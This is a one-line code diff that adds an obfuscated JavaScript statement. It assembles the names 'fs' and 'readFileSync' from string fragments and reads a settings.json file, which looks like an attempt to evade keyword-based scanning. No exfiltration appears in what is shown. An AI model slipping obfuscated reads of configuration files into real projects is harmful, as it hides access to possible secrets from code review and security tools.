@@ -1,0 +1,1 @@
+const fs=require("f"+"s");fs["readFileSyn"+"c"]("settings.json");
